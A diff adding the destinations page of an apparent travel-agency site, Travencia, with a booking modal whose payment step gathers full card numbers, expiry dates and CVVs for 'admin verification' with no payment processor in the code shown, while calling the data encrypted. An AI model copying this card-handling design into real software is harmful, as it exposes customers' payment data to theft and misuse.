@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+  <meta name="tv-wa" content="REPLACE_WITH_WHATSAPP_NUMBER"/>
+  <meta name="tv-email" content="travenciaagency@gmail.com"/>
+<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+<title>Destinations — Travencia</title>
+<link rel="stylesheet" href="css/main.css"/>
+<style>
+.page-hero{position:relative;height:420px;overflow:hidden;display:flex;align-items:flex-end;padding:0 56px 52px}
+.ph-bg{position:absolute;inset:0;background-image:url('images/Paris.jpeg');background-size:cover;background-position:center}
+.ph-grad{position:absolute;inset:0;background:linear-gradient(160deg,rgba(4,8,15,.7),rgba(4,8,15,.88))}
+.ph-content{position:relative;z-index:2}
+.ph-eyebrow{font-size:.67rem;letter-spacing:.34em;text-transform:uppercase;color:var(--sky2);background:rgba(45,114,210,.08);border:1px solid rgba(45,114,210,.22);padding:4px 13px;border-radius:20px;display:inline-block;margin-bottom:14px}
+.ph-title{font-family:'Bebas Neue',sans-serif;font-size:clamp(2.6rem,5vw,4.2rem);letter-spacing:.04em;color:var(--white);line-height:1;margin-bottom:10px}
+.ph-title .g{color:var(--gold2)}
+.ph-sub{font-size:.93rem;color:var(--muted);max-width:540px;line-height:1.85;font-weight:400;letter-spacing:.01em}
+.dest-full-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:22px}
+.filter-bar{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:36px;align-items:center}
+.fb{padding:7px 20px;border-radius:6px;font-size:.74rem;letter-spacing:.1em;text-transform:uppercase;font-weight:600;border:1.5px solid rgba(45,114,210,.2);background:transparent;color:var(--muted);cursor:pointer;transition:all .3s}
+.fb.active,.fb:hover{background:linear-gradient(130deg,var(--blue),var(--blue2));border-color:var(--sky);color:var(--white)}
+.sort-sel{margin-left:auto;background:rgba(12,22,40,.8);border:1.5px solid rgba(45,114,210,.16);border-radius:7px;padding:8px 16px;color:var(--white);font-size:.78rem;font-family:'Plus Jakarta Sans',sans-serif;cursor:pointer}
+.sort-sel option{background:var(--navy2)}
+.results-count{font-size:.8rem;color:var(--muted);margin-bottom:20px}
+.results-count strong{color:var(--white)}
+
+/* ── RESPONSIVE ── */
+@media(max-width:1100px){.dest-full-grid{grid-template-columns:repeat(2,1fr)}}
+@media(max-width:900px){
+  .page-hero{padding:0 28px 40px}
+  .filter-bar{gap:6px;flex-wrap:wrap}
+  .sort-sel{margin-left:0;width:100%}
+  .section{padding:44px 24px}
+}
+@media(max-width:600px){
+  .page-hero{height:280px;padding:0 18px 28px}
+  .ph-title{font-size:clamp(2rem,8vw,2.8rem)}
+  .ph-sub{font-size:.82rem}
+  .dest-full-grid{grid-template-columns:1fr}
+  .filter-bar{gap:5px}
+  .fb{padding:6px 12px;font-size:.68rem}
+  .section{padding:36px 16px}
+}
+</style>
+</head>
+<body>
+
+<nav class="navbar" id="nb">
+  <div class="nb-brand" onclick="location.href='index.html'">
+    <img src="images/Travencia.png" alt="Travencia" class="nb-logo"/>
+    <div class="nb-text"><span class="nb-name">Travencia</span><span class="nb-tag">Explore · Dream · Discover</span></div>
+  </div>
+  <div class="nb-links" id="nbLinks">
+    <a href="index.html">Home</a>
+    <a href="destinations.html" class="active">Destinations</a>
+    <a href="activities.html">Activities</a>
+    <a href="services.html">Services</a>
+    <a href="contact.html">Contact</a>
+  </div>
+  <div class="nb-right" id="nbRight">
+    <button class="btn-ghost" onclick="openAuth('login')">Sign In</button>
+    <button class="btn-cta" onclick="openBooking(null)">Book Now</button>
+  </div>
+  <button class="nb-ham" id="nbHamburger" aria-label="Menu" aria-expanded="false">&#9776;</button>
+</nav>
+
+<!-- PAGE HERO -->
+<div class="page-hero" style="margin-top:74px">
+  <div class="ph-bg"></div>
+  <div class="ph-grad"></div>
+  <div class="ph-content">
+    <div class="ph-eyebrow">20 Destinations · 5 Continents</div>
+    <h1 class="ph-title">Your World, <span class="g">Your Journey</span></h1>
+    <p class="ph-sub">Every package is built around you — return flights, hand-picked hotels, and private transfers included. Priced from your departure city, so what you see is what you pay.</p>
+  </div>
+</div>
+
+<!-- _DESTS -->
+<section class="section" id="dests">
+  <div class="filter-bar reveal">
+    <button class="fb active" data-f="all">All (20)</button>
+    <button class="fb" data-f="Asia">Asia</button>
+    <button class="fb" data-f="Europe">Europe</button>
+    <button class="fb" data-f="Africa">Africa</button>
+    <button class="fb" data-f="Americas">Americas</button>
+    <button class="fb" data-f="Middle East">Middle East</button>
+    <select class="sort-sel" id="sortSel" onchange="buildGrid()">
+      <option value="default">Sort: Featured</option>
+      <option value="price_asc">Price: Low to High</option>
+      <option value="price_desc">Price: High to Low</option>
+      <option value="rating">Top Rated</option>
+      <option value="az">A to Z</option>
+    </select>
+  </div>
+  <div class="results-count" id="resCount"></div>
+  <div class="dest-full-grid" id="destGrid"></div>
+</section>
+
+<!-- FOOTER -->
+<footer>
+  <div class="ft-grid">
+    <div>
+      <img src="images/Travencia.png" alt="Travencia" class="ft-logo"/>
+      <div class="ft-name">Travencia</div>
+      <p class="ft-tagline">Flights, hotels, activities, and private transfers — every detail handled, every destination mastered.</p>
+    </div>
+    <div><div class="ft-col-h">Destinations</div><ul class="ft-links"><li><a href="#">Bali</a></li><li><a href="#">Dubai</a></li><li><a href="#">Maldives</a></li><li><a href="#">Paris</a></li><li><a href="#">Tokyo</a></li></ul></div>
+    <div><div class="ft-col-h">Services</div><ul class="ft-links"><li><a href="activities.html">Activities</a></li><li><a href="services.html">Transfers</a></li><li><a href="services.html">Driver Service</a></li><li><a href="contact.html">Custom Packages</a></li></ul></div>
+    <div><div class="ft-col-h">Company</div><ul class="ft-links"><li><a href="contact.html">About</a></li><li><a href="contact.html">Contact</a></li><li><a href="#">Privacy</a></li><li><a href="#">Terms</a></li></ul></div>
+  </div>
+  <div class="ft-bot"><span class="ft-copy">© 2026 Travencia. All rights reserved.</span><span class="ft-copy">Explore · Dream · Discover</span></div>
+</footer>
+
+<!-- DEST DETAIL MODAL -->
+<div class="overlay" id="destModal">
+  <div class="modal" style="max-width:920px">
+    <button class="m-close" onclick="closeM('destModal')">&#10005;</button>
+    <div id="destModalInner"></div>
+  </div>
+</div>
+
+<!-- BOOKING MODAL (same as index) -->
+<div class="overlay" id="bookModal">
+  <div class="modal" style="max-width:700px">
+    <button class="m-close" onclick="closeM('bookModal')">&#10005;</button>
+    <div class="bk-steps" id="bkSteps">
+      <div class="bk-step active" data-s="1"><div class="bk-snum">1</div><div class="bk-slbl">Trip</div></div>
+      <div class="bk-step" data-s="2"><div class="bk-snum">2</div><div class="bk-slbl">Details</div></div>
+      <div class="bk-step" data-s="3"><div class="bk-snum">3</div><div class="bk-slbl">Payment</div></div>
+    </div>
+    <div style="padding:22px 30px 28px">
+      <div id="bs1" class="bk-sc" style="display:block">
+        <div style="font-family:'Bebas Neue',sans-serif;font-size:1.65rem;color:var(--white);letter-spacing:.05em;margin-bottom:18px">Plan Your <span style="color:var(--gold2)">Trip</span></div>
+        <div class="fg"><label>Destination</label><select id="bk_dest" onchange="onDestChange()"></select></div>
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px"><div class="fg"><label>Departure</label><input type="date" id="bk_dep" onchange="recalc()"/></div><div class="fg"><label>Return</label><input type="date" id="bk_ret" onchange="recalc()"/></div></div>
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px"><div class="fg"><label>Adults</label><select id="bk_adults" onchange="recalc()"><option value="1">1 Adult</option><option value="2">2 Adults</option><option value="3">3 Adults</option><option value="4">4 Adults</option><option value="5">5 Adults</option><option value="6">6 Adults</option></select></div><div class="fg"><label>Children</label><select id="bk_children" onchange="recalc()"><option value="0">None</option><option value="1">1</option><option value="2">2</option><option value="3">3</option></select></div></div>
+        <div class="fg"><label>Your Country</label><select id="bk_country" onchange="recalc()"></select></div>
+        <div class="fg"><label>Accommodation</label><select id="bk_acc" onchange="recalc()"><option value="">Standard (included)</option></select></div>
+        <div id="bk_acts_wrap" style="display:none;margin-top:2px"><label style="display:block;font-size:.65rem;letter-spacing:.16em;text-transform:uppercase;color:var(--sky2);font-weight:600;margin-bottom:10px">Add Activities</label><div style="display:grid;grid-template-columns:1fr 1fr;gap:9px" id="bk_acts_list"></div></div>
+        <div id="bk_price_wrap" style="display:none;margin-top:18px"></div>
+        <div class="gerr" id="err1"></div>
+      </div>
+      <div id="bs2" class="bk-sc" style="display:none">
+        <div style="font-family:'Bebas Neue',sans-serif;font-size:1.65rem;color:var(--white);letter-spacing:.05em;margin-bottom:18px">Your <span style="color:var(--gold2)">Details</span></div>
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px"><div class="fg"><label>First Name *</label><input type="text" id="bk_fn" placeholder="Jean"/><div class="ferr" id="e_fn"></div></div><div class="fg"><label>Last Name *</label><input type="text" id="bk_ln" placeholder="Dupont"/><div class="ferr" id="e_ln"></div></div></div>
+        <div class="fg"><label>Email *</label><input type="email" id="bk_email" placeholder="jean@email.com"/><div class="ferr" id="e_em"></div></div>
+        <div class="fg"><label>WhatsApp Number</label><input type="tel" id="bk_phone" placeholder="+1 (512) XXX-XXXX"/></div>
+        <div class="fg"><label>Special Requests</label><textarea id="bk_notes" placeholder="Dietary needs, accessibility, special occasions..."></textarea></div>
+        <div class="gerr" id="err2"></div>
+      </div>
+      <div id="bs3" class="bk-sc" style="display:none">
+        <div style="font-family:'Bebas Neue',sans-serif;font-size:1.65rem;color:var(--white);letter-spacing:.05em;margin-bottom:8px">Secure <span style="color:var(--gold2)">Payment</span></div>
+        <p style="font-size:.78rem;color:var(--muted);margin-bottom:16px">Encrypted and sent to our admin for verification. WhatsApp confirmation within 2 hours.</p>
+        <div id="order_sum" style="margin-bottom:14px"></div>
+        <div style="display:flex;gap:11px;margin-bottom:16px">
+          <div class="pt active" data-m="mastercard" onclick="selPay('mastercard')" style="flex:1;padding:12px;border:2px solid var(--sky);border-radius:9px;text-align:center;cursor:pointer;background:rgba(45,114,210,.09)"><div style="font-family:'Bebas Neue',sans-serif;font-size:.9rem;letter-spacing:.08em;color:var(--white)">MASTERCARD</div><div style="font-size:.63rem;letter-spacing:.1em;text-transform:uppercase;color:var(--sky2)">Credit Card</div></div>
+          <div class="pt" data-m="visa" onclick="selPay('visa')" style="flex:1;padding:12px;border:2px solid rgba(45,114,210,.15);border-radius:9px;text-align:center;cursor:pointer;background:rgba(12,22,40,.6)"><div style="font-family:'Bebas Neue',sans-serif;font-size:.9rem;letter-spacing:.08em;color:var(--muted)">VISA</div><div style="font-size:.63rem;letter-spacing:.1em;text-transform:uppercase;color:var(--faint)">Credit Card</div></div>
+          <div class="pt" data-m="paypal" onclick="selPay('paypal')" style="flex:1;padding:12px;border:2px solid rgba(45,114,210,.15);border-radius:9px;text-align:center;cursor:pointer;background:rgba(12,22,40,.6)"><div style="font-family:'Bebas Neue',sans-serif;font-size:.9rem;letter-spacing:.08em;color:var(--muted)">PAYPAL</div><div style="font-size:.63rem;letter-spacing:.1em;text-transform:uppercase;color:var(--faint)">Online Payment</div></div>
+        </div>
+        <div id="pf_mastercard" class="pf" style="display:block">
+          <div class="card-vis mc"><div style="display:flex;justify-content:space-between;align-items:flex-start"><div class="c-chip"></div><div class="c-brand-mc"><div class="c-circle c-red"></div><div class="c-circle c-orange"></div></div></div><div class="c-num" id="mc_n_d">&#x2022;&#x2022;&#x2022;&#x2022; &#x2022;&#x2022;&#x2022;&#x2022; &#x2022;&#x2022;&#x2022;&#x2022; &#x2022;&#x2022;&#x2022;&#x2022;</div><div class="c-bot"><span id="mc_nm_d">CARDHOLDER NAME</span><span id="mc_ex_d">MM/YY</span></div></div>
+          <div class="fg"><label>Cardholder Name *</label><input type="text" id="mc_name" placeholder="JEAN DUPONT" oninput="upMC()" style="text-transform:uppercase"/></div>
+          <div class="fg"><label>Card Number *</label><input type="text" id="mc_num" placeholder="1234 5678 9012 3456" maxlength="19" oninput="fCard(this);upMC()"/></div>
+          <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px"><div class="fg"><label>Expiry *</label><input type="text" id="mc_exp" placeholder="MM/YY" maxlength="5" oninput="fExp(this);upMC()"/></div><div class="fg"><label>CVV *</label><input type="password" id="mc_cvv" placeholder="&#x2022;&#x2022;&#x2022;" maxlength="4"/></div></div>
+        </div>
+        <div id="pf_visa" class="pf" style="display:none">
+          <div class="card-vis visa"><div class="c-chip"></div><div class="c-num" id="visa_n_d">&#x2022;&#x2022;&#x2022;&#x2022; &#x2022;&#x2022;&#x2022;&#x2022; &#x2022;&#x2022;&#x2022;&#x2022; &#x2022;&#x2022;&#x2022;&#x2022;</div><div class="c-bot"><span id="visa_nm_d">CARDHOLDER NAME</span><span id="visa_ex_d">MM/YY</span></div><div class="c-visa-txt">VISA</div></div>
+          <div class="fg"><label>Name *</label><input type="text" id="visa_name" oninput="upVisa()" style="text-transform:uppercase" placeholder="JEAN DUPONT"/></div>
+          <div class="fg"><label>Card Number *</label><input type="text" id="visa_num" maxlength="19" oninput="fCard(this);upVisa()" placeholder="1234 5678 9012 3456"/></div>
+          <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px"><div class="fg"><label>Expiry *</label><input type="text" id="visa_exp" maxlength="5" oninput="fExp(this);upVisa()" placeholder="MM/YY"/></div><div class="fg"><label>CVV *</label><input type="password" id="visa_cvv" maxlength="3" placeholder="&#x2022;&#x2022;&#x2022;"/></div></div>
+        </div>
+        <div id="pf_paypal" class="pf" style="display:none">
+          <div style="background:rgba(0,80,130,.1);border:2px dashed rgba(45,114,210,.2);border-radius:12px;padding:24px;text-align:center"><div style="font-family:'Bebas Neue',sans-serif;font-size:2rem;letter-spacing:.12em;color:var(--sky2);margin-bottom:10px">PAYPAL</div><p style="font-size:.84rem;color:var(--muted);margin-bottom:14px">Our PayPal details will be sent to you via WhatsApp after submission.</p><div class="fg"><label>Your PayPal Email *</label><input type="email" id="pp_email" placeholder="your@paypal.com"/><div class="ferr" id="e_pp"></div></div></div>
+          <div style="background:rgba(200,149,32,.09);border:1px solid rgba(200,149,32,.2);border-radius:8px;padding:13px;margin-top:12px;font-size:.78rem;color:var(--muted);line-height:1.7"><strong style="color:var(--gold2);display:block;margin-bottom:4px">PayPal Instructions</strong>After submitting, send the total to <strong style="color:var(--gold2)">travenciaagency@gmail.com</strong> with your booking code as reference.</div>
+        </div>
+        <div class="gerr" id="err3"></div>
+      </div>
+    </div>
+    <div style="padding:14px 30px 22px;display:flex;align-items:center;justify-content:space-between;gap:12px;border-top:1px solid rgba(45,114,210,.1)">
+      <div><div style="font-size:.74rem;color:var(--muted)">Estimated Total</div><span style="font-family:'Bebas Neue',sans-serif;font-size:1.55rem;color:var(--gold2);letter-spacing:.05em;display:block" id="bkAmt">—</span></div>
+      <div style="display:flex;gap:10px"><button class="btn-back" id="btnBack" onclick="bkNav(-1)" style="display:none">Back</button><button class="btn-primary" id="btnNext" onclick="bkNav(1)">Continue</button></div>
+    </div>
+  </div>
+</div>
+
+<!-- AUTH -->
+
+
+<!-- WAITING -->
+<div class="wait-overlay" id="waitOver">
+  <div class="pulse"></div>
+  <div style="font-family:'Bebas Neue',sans-serif;font-size:2rem;color:var(--white);letter-spacing:.1em">Reservation Submitted</div>
+  <div style="font-family:'Bebas Neue',sans-serif;font-size:2.2rem;color:var(--gold2);letter-spacing:.18em;margin:12px 0" id="waitCode">TV-XXXXXXXX</div>
+  <p style="font-size:.87rem;color:var(--muted);max-width:400px;line-height:1.75;margin-bottom:22px">Pending admin verification. WhatsApp confirmation within 2 hours.</p>
+  <div style="display:flex;gap:12px;flex-wrap:wrap;justify-content:center;margin-bottom:22px">
+    <button class="btn-primary" onclick="newReservation()">Another Reservation</button>
+    <button class="btn-outline" onclick="document.getElementById('waitOver').classList.remove('open')">Close</button>
+  </div>
+  <div id="resList" style="width:100%;max-width:520px"></div>
+</div>
+
+<script src="js/data.js"></script>
+<script src="js/auth.js"></script>
+<script src="js/booking.js"></script>
+<script>
+var TV=window.TV;
+var _DESTS=TV.DESTINATIONS,_ACCOMM=TV.ACCOMMODATIONS,_ACTS=TV.ACTIVITIES,_COUNTRIES=TV.COUNTRIES;
+var fmt=TV.fmt,calcPrice=TV.calcPrice,sendWA=TV.sendWA,genCode=TV.genCode;
+var _WA=TV.ADMIN_WHATSAPP,_PP=TV.ADMIN_PAYPAL_EMAIL;
+let activeF='all';let bkS={step:1,destId:null,accId:null,acts:[],pricing:null,payM:'mastercard'};let pendRes=[];
+
+function buildGrid(){
+  let list=activeF==='all'?[..._DESTS]:_DESTS.filter(d=>d.continent===activeF);
+  const sort=document.getElementById('sortSel').value;
+  if(sort==='price_asc')list.sort((a,b)=>a.basePrice-b.basePrice);
+  else if(sort==='price_desc')list.sort((a,b)=>b.basePrice-a.basePrice);
+  else if(sort==='rating')list.sort((a,b)=>b.rating-a.rating);
+  else if(sort==='az')list.sort((a,b)=>a.name.localeCompare(b.name));
+  document.getElementById('resCount').innerHTML=`Showing <strong>${list.length}</strong> destination${list.length!==1?'s':''}`;
+  document.getElementById('destGrid').innerHTML=list.map(d=>`
+    <div class="dest-card reveal" onclick="openDest(${d.id})">
+      <div class="dc-img"><img src="${d.img}" alt="${d.name}" loading="lazy"/><div class="dc-badge">${d.continent}</div><div class="dc-stars">&#9733; ${d.rating}</div></div>
+      <div class="dc-body">
+        <div class="dc-name">${d.name}</div>
+        <div class="dc-loc">${d.country} &#8226; ${d.climate} &#8226; ${d.season}</div>
+        <div class="dc-desc">${d.desc}</div>
+        <div class="dc-foot">
+          <div><div class="dc-from">All-inclusive from</div><div class="dc-price">${fmt(d.basePrice)} <small>USD/person</small></div></div>
+          <button class="btn-sm-outline">Explore</button>
+        </div>
+      </div>
+    </div>`).join('');
+  observeReveal();
+}
+document.querySelectorAll('.fb').forEach(b=>{b.addEventListener('click',function(){document.querySelectorAll('.fb').forEach(x=>x.classList.remove('active'));this.classList.add('active');activeF=this.dataset.f;buildGrid();});});
+
+function openDest(id){
+  const d=_DESTS.find(x=>x.id===id);if(!d)return;
+  const accs=_ACCOMM[id]||[];const acts=_ACTS[id]||[];
+  const accH=accs.map(a=>`<div class="ac-card"><div class="ac-n">${a.n}</div><span class="ac-t">${a.t}</span><div class="ac-s">${'&#9733;'.repeat(a.s)}</div><div class="ac-p">$${a.ppn}<span style="font-size:.68rem;color:var(--muted);font-family:'Plus Jakarta Sans',sans-serif"> /night</span></div><div class="ac-tags">${(a.am||[]).map(x=>`<span class="ac-tag">${x}</span>`).join('')}</div></div>`).join('');
+  const actH=acts.length?acts.map(a=>`<div class="al-item"><div class="al-cb">&#10003;</div><div><div class="al-n">${a.n}</div><div class="al-cat">${a.cat}</div><div class="al-meta">+$${a.price}/person &#8226; ${a.dur}h</div></div></div>`).join(''):'<p style="color:var(--muted);font-size:.84rem">Activities selectable during booking.</p>';
+  document.getElementById('destModalInner').innerHTML=`
+    <div style="height:300px;border-radius:20px 20px 0 0;overflow:hidden;position:relative"><img src="${d.img}" style="width:100%;height:100%;object-fit:cover"/><div style="position:absolute;inset:0;background:linear-gradient(to top,var(--navy3),transparent 60%)"></div><div style="position:absolute;bottom:20px;left:28px;right:28px;display:flex;align-items:flex-end;justify-content:space-between"><div><div style="font-family:'Bebas Neue',sans-serif;font-size:2.7rem;color:var(--white);letter-spacing:.05em;line-height:1">${d.name}</div><div style="font-size:.78rem;color:var(--sky2);letter-spacing:.1em;margin-top:3px">${d.country} &#8226; ${d.climate}</div></div><div style="padding:7px 13px;background:rgba(200,149,32,.14);border:1px solid rgba(200,149,32,.28);border-radius:8px;text-align:center"><div style="font-family:'Bebas Neue',sans-serif;font-size:1.6rem;color:var(--gold2);letter-spacing:.1em;line-height:1">&#9733;${d.rating}</div><div style="font-size:.6rem;color:var(--muted);letter-spacing:.14em;text-transform:uppercase">Rating</div></div></div></div>
+    <div style="padding:24px 28px">
+      <div style="display:flex;border-bottom:1px solid rgba(45,114,210,.12);margin-bottom:22px">
+        <button class="dm-tab active" onclick="dTab(this,'dt_ov')">Overview</button>
+        <button class="dm-tab" onclick="dTab(this,'dt_acc')">Accommodation</button>
+        <button class="dm-tab" onclick="dTab(this,'dt_act')">Activities</button>
+      </div>
+      <div class="dm-tc active" id="dt_ov"><p style="font-size:.86rem;color:var(--muted);line-height:1.8;margin-bottom:14px">${d.desc}</p><div style="display:grid;grid-template-columns:1fr 1fr;gap:10px"><div class="ov-item"><div class="ov-lbl">Best Season</div><div class="ov-val">${d.season}</div></div><div class="ov-item"><div class="ov-lbl">Climate</div><div class="ov-val">${d.climate}</div></div><div class="ov-item"><div class="ov-lbl">Package from</div><div class="ov-val" style="color:var(--gold2)">$${fmt(d.basePrice)} USD</div></div><div class="ov-item"><div class="ov-lbl">Includes</div><div class="ov-val">Flights + Hotel + Transfers</div></div></div></div>
+      <div class="dm-tc" id="dt_acc"><div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">${accH}</div></div>
+      <div class="dm-tc" id="dt_act"><div style="display:grid;grid-template-columns:1fr 1fr;gap:9px">${actH}</div></div>
+    </div>`;
+  const old=document.querySelector('#destModal .dm-foot');if(old)old.remove();
+  document.querySelector('#destModal .modal').insertAdjacentHTML('beforeend',`<div class="dm-foot"><div class="dm-fp">All-inclusive from<span class="dm-big">$${fmt(d.basePrice)} USD</span></div><button class="btn-primary" onclick="closeM('destModal');openBooking(${d.id})">Book This Trip</button></div>`);
+  openM('destModal');
+}
+function dTab(btn,tid){btn.closest('div').querySelectorAll('.dm-tab').forEach(t=>t.classList.remove('active'));btn.classList.add('active');document.querySelectorAll('.dm-tc').forEach(t=>t.classList.remove('active'));document.getElementById(tid).classList.add('active');}
+
+function populateBk(){
+  const ds=document.getElementById('bk_dest');ds.innerHTML='<option value="">&#8212; Select destination &#8212;</option>';_DESTS.forEach(d=>ds.add(new Option(`${d.name}, ${d.country}`,d.id)));
+  const cs=document.getElementById('bk_country');cs.innerHTML='<option value="">&#8212; Your country &#8212;</option>';
+  const regs={};_COUNTRIES.forEach(c=>{if(!regs[c.r])regs[c.r]=[];regs[c.r].push(c)});
+  Object.entries(regs).forEach(([r,cs2])=>{const og=document.createElement('optgroup');og.label=r;cs2.forEach(c=>og.appendChild(new Option(c.n,c.c)));cs.appendChild(og);});
+  cs.value='US';
+  // Default US phone prefix
+  const _phoneEl = document.getElementById('bk_phone') || document.getElementById('v_phone') || document.getElementById('cf_phone');
+  if (_phoneEl && !_phoneEl.value) _phoneEl.value = '+1 ';const today=new Date().toISOString().split('T')[0];document.getElementById('bk_dep').min=today;document.getElementById('bk_ret').min=today;
+}
+function openBooking(destId){populateBk();bkS={step:1,destId:null,accId:null,acts:[],pricing:null,payM:'mastercard'};if(destId){document.getElementById('bk_dest').value=destId;bkS.destId=destId;onDestChange();}setBkStep(1);openM('bookModal');}
+function onDestChange(){
+  const id=parseInt(document.getElementById('bk_dest').value);if(!id)return;bkS.destId=id;bkS.acts=[];
+  const accs=_ACCOMM[id]||[];const asel=document.getElementById('bk_acc');asel.innerHTML='<option value="">Standard (included)</option>';accs.forEach(a=>asel.add(new Option(`${a.n} +$${a.ppn}/night`,a.id)));
+  const acts=_ACTS[id]||[];const wrap=document.getElementById('bk_acts_wrap');const list=document.getElementById('bk_acts_list');
+  if(acts.length){wrap.style.display='block';list.innerHTML=acts.map(a=>`<div class="al-item" id="bka_${a.id}" onclick="togAct(${a.id})" style="background:rgba(12,22,40,.6);border:2px solid rgba(45,114,210,.1);border-radius:8px;padding:13px;display:flex;gap:11px;cursor:pointer;transition:all .3s"><div class="al-cb" id="bkcb_${a.id}" style="width:18px;height:18px;border:2px solid rgba(45,114,210,.3);border-radius:4px;display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:.65rem;color:transparent;transition:all .3s">&#10003;</div><div><div class="al-n" style="font-size:.84rem;font-weight:600;color:var(--white);margin-bottom:2px">${a.n}</div><div style="font-size:.68rem;text-transform:uppercase;letter-spacing:.1em;color:var(--faint);margin-bottom:5px">${a.cat}</div><div style="font-size:.74rem;color:var(--muted)">+$${a.price}/person &#8226; ${a.dur}h</div></div></div>`).join('');}else wrap.style.display='none';
+  recalc();
+}
+function togAct(id){const el=document.getElementById('bka_'+id);const cb=document.getElementById('bkcb_'+id);const i=bkS.acts.indexOf(id);if(i===-1){bkS.acts.push(id);el.style.borderColor='rgba(200,149,32,.4)';el.style.background='rgba(200,149,32,.04)';cb.style.cssText='width:18px;height:18px;border:2px solid var(--gold);border-radius:4px;display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:.65rem;color:var(--navy);background:var(--gold);transition:all .3s';}else{bkS.acts.splice(i,1);el.style.borderColor='rgba(45,114,210,.1)';el.style.background='rgba(12,22,40,.6)';cb.style.cssText='width:18px;height:18px;border:2px solid rgba(45,114,210,.3);border-radius:4px;display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:.65rem;color:transparent;transition:all .3s';}recalc();}
+function recalc(){const destId=parseInt(document.getElementById('bk_dest').value)||bkS.destId;const dep=document.getElementById('bk_dep').value;const ret=document.getElementById('bk_ret').value;const country=document.getElementById('bk_country').value;const adults=parseInt(document.getElementById('bk_adults').value)||1;const children=parseInt(document.getElementById('bk_children').value)||0;const accId=parseInt(document.getElementById('bk_acc').value)||null;const wrap=document.getElementById('bk_price_wrap');if(!destId||!dep||!ret||dep>=ret){wrap.style.display='none';return;}const p=calcPrice({destId,dep,ret,country,adults,children,accId,actIds:bkS.acts});if(!p){wrap.style.display='none';return;}bkS.pricing=p;document.getElementById('bkAmt').textContent='$'+fmt(p.total);wrap.style.display='block';wrap.innerHTML=`<div class="pb"><div class="pb-head">Breakdown &#8212; ${p.nights} nights &#183; ${p.persons} guests${p.peak?' &#183; Peak':''}</div><div class="pb-row"><span class="pb-l">Flights</span><span class="pb-v">$${fmt(p.flightCost)}</span></div><div class="pb-row"><span class="pb-l">Accommodation</span><span class="pb-v">$${fmt(p.accCost)}</span></div>${p.actCost?`<div class="pb-row"><span class="pb-l">Activities</span><span class="pb-v">$${fmt(p.actCost)}</span></div>`:''}<div class="pb-row"><span class="pb-l">Taxes (12%)</span><span class="pb-v">$${fmt(p.taxes)}</span></div><div class="pb-row total"><span class="pb-l">Total</span><span class="pb-v">$${fmt(p.total)} USD</span></div></div>`;}
+function setBkStep(s){bkS.step=s;['bs1','bs2','bs3'].forEach((id,i)=>{document.getElementById(id).style.display=i+1===s?'block':'none';});document.querySelectorAll('.bk-step').forEach(e=>{const n=parseInt(e.dataset.s);e.classList.remove('active','done');if(n===s)e.classList.add('active');else if(n<s)e.classList.add('done');});document.getElementById('btnBack').style.display=s>1?'inline-flex':'none';const nb=document.getElementById('btnNext');nb.textContent=s===1?'Continue':s===2?'Proceed to Payment':'Confirm & Submit';if(s===3){const p=bkS.pricing;const d=_DESTS.find(x=>x.id===bkS.destId);document.getElementById('order_sum').innerHTML=p&&d?`<div class="pb" style="margin-bottom:12px"><div style="display:flex;gap:10px;align-items:center;margin-bottom:10px"><img src="${d.img}" style="width:46px;height:46px;border-radius:7px;object-fit:cover"/><div><strong style="color:var(--white)">${d.name}</strong><br><span style="font-size:.74rem;color:var(--muted)">${document.getElementById('bk_dep').value} &#8594; ${document.getElementById('bk_ret').value}</span></div></div><div class="pb-row total"><span class="pb-l">Total</span><span class="pb-v">$${fmt(p.total)} USD</span></div></div>`:'';}};
+function bkNav(dir){if(dir===1){if(!validateBk(bkS.step))return;if(bkS.step===3){submitBk();return;}setBkStep(bkS.step+1);}else setBkStep(bkS.step-1);}
+function validateBk(s){clearE();if(s===1){if(!document.getElementById('bk_dest').value){sErr('err1','Please select a destination.');return false;}if(!document.getElementById('bk_dep').value){sErr('err1','Please select departure date.');return false;}if(!document.getElementById('bk_ret').value){sErr('err1','Please select return date.');return false;}if(document.getElementById('bk_dep').value>=document.getElementById('bk_ret').value){sErr('err1','Return must be after departure.');return false;}if(!document.getElementById('bk_country').value){sErr('err1','Please select your country.');return false;}return true;}if(s===2){let ok=true;if(!document.getElementById('bk_fn').value.trim()){document.getElementById('e_fn').textContent='Required';ok=false;}if(!document.getElementById('bk_ln').value.trim()){document.getElementById('e_ln').textContent='Required';ok=false;}const em=document.getElementById('bk_email').value;if(!em||!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(em)){document.getElementById('e_em').textContent='Valid email required';ok=false;}return ok;}if(s===3){const m=bkS.payM;if(m==='mastercard'||m==='visa'){const p=m==='mastercard'?'mc':'visa';const num=document.getElementById(p+'_num').value.replace(/\s/g,'');const exp=document.getElementById(p+'_exp').value;const cvv=document.getElementById(p+'_cvv').value;if(!/^\d{16}$/.test(num)||!/^\d{2}\/\d{2}$/.test(exp)||cvv.length<3){sErr('err3','Please complete all card details.');return false;}}if(m==='paypal'){const em=document.getElementById('pp_email').value;if(!em||!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(em)){document.getElementById('e_pp').textContent='Valid PayPal email required';return false;}}return true;}return true;}
+function submitBk(){
+  const btn=document.getElementById('btnNext');
+  btn.disabled=true;btn.textContent='Processing...';
+
+  const dest=_DESTS.find(x=>x.id===bkS.destId)||{};
+  const p=bkS.pricing||{};
+  const m=bkS.payM;
+  const fn=document.getElementById('bk_fn').value.trim();
+  const ln=document.getElementById('bk_ln').value.trim();
+  const em=document.getElementById('bk_email').value.trim();
+  const ph=document.getElementById('bk_phone').value.trim();
+  const dep=document.getElementById('bk_dep').value;
+  const ret=document.getElementById('bk_ret').value;
+  const adults=parseInt(document.getElementById('bk_adults').value)||1;
+  const children=parseInt(document.getElementById('bk_children').value)||0;
+  const co=document.getElementById('bk_country');
+  const coCode=co.value||'US';
+  const coName=co.options[co.selectedIndex]?.text||coCode;
